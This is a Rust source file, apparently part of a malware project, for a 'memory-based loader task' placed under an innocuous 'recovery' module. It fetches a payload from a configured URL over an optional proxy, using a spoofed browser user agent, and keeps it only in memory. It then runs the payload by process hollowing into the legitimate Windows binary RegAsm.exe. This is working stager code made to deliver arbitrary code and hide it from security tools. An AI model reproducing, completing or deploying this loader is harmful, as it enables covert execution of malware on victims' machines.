use crate::recovery::hollowing;
use crate::recovery::settings::RecoveryControl;
use tracing::{error, info};

pub async fn run_loader() {
    let control = RecoveryControl::global();
    let Some(url) = control.loader_url() else {
        return;
    };

    if url.trim().is_empty() {
        return;
    }

    info!(url = %url, "starting memory-based loader task");

    match download_payload(url).await {
        Ok(bytes) => {
            info!("payload downloaded to memory ({} bytes)", bytes.len());
            let target = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe";
            match execute_payload(&bytes, target) {
                Ok(_) => info!("payload executed via process hollowing into {}", target),
                Err(e) => error!(error = %e, "failed to execute payload"),
            }
        }
        Err(e) => error!(error = %e, "failed to download payload"),
    }
}

async fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut builder = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");

    if let Some(proxy_url) = &RecoveryControl::global().proxy_server {
        if let Ok(proxy) = reqwest::Proxy::all(proxy_url) {
            builder = builder.proxy(proxy);
        }
    }

    let client = builder.build()?;

    let response = client.get(url).send().await?;
    if !response.status().is_success() {
        return Err(format!("server returned status: {}", response.status()).into());
    }

    let bytes = response.bytes().await?;
    Ok(bytes.to_vec())
}

fn execute_payload(bytes: &[u8], target: &str) -> Result<(), Box<dyn std::error::Error>> {
    hollowing::run_overloaded(bytes, target)
}
